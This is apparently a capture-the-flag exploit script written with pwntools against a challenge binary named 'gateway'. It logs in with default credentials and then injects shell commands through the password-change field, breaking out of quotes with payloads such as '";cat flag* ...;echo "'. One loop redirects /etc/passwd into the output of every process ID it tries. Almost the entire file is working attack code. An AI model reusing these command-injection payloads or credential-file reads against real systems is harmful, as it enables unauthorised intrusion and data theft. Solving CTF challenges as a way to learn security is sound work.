from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep

context.arch = "amd64"
context.word_size = 64

file = "./gateway"
args = []
io: process = None

speed = 0#0.05

def debug():
    gdb.attach(io, gdbscript=
    """

    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="vsc.tf", port=7003)

def launch_local():
    global file, io
    io = process([file, *args])
    # debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_local
    # l = launch_remote
    l()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1: a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1: b_ = 0
    return d[a_+len(a):b_]

#
# exploit goes here
#

exe = ELF(file)

def exploit():
    sla(b"Username: ", b"admin")
    sla(b"Password: ", b"123456")
    def change_passwd(new):
        sla(b"> ", b"5")
        if type(new) == str:
            new = new.encode("iso-8859-1")
        sla(b"New password: ", new)
    
    change_passwd(f'";cat flag* 1>/proc/$(pidof -s gateway)/fd/1;echo "')

    io.interactive()

    for i in range(0x100):
        change_passwd(f'";cat /etc/passwd 1>/proc/{i}/fd/1;echo "')
        print(recvu(b"- MENU -"))

    io.interactive()
    input("end")
    exit()

try:
    launch()
    exploit()
except Exception as e:
    print(e)
    input()